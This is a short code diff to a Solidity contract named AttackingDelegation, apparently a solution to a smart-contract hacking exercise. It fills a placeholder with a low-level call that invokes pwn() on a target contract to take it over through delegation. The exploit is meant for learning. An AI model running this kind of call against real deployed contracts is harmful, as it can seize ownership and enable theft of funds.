@@ -10,6 +10,8 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        // solhint-disable-next-line avoid-low-level-calls
+        (bool success, ) = contractAddress.call(abi.encodeWithSignature("pwn()"));
+        require(success, "pwn unsuccessful");
     }
 }
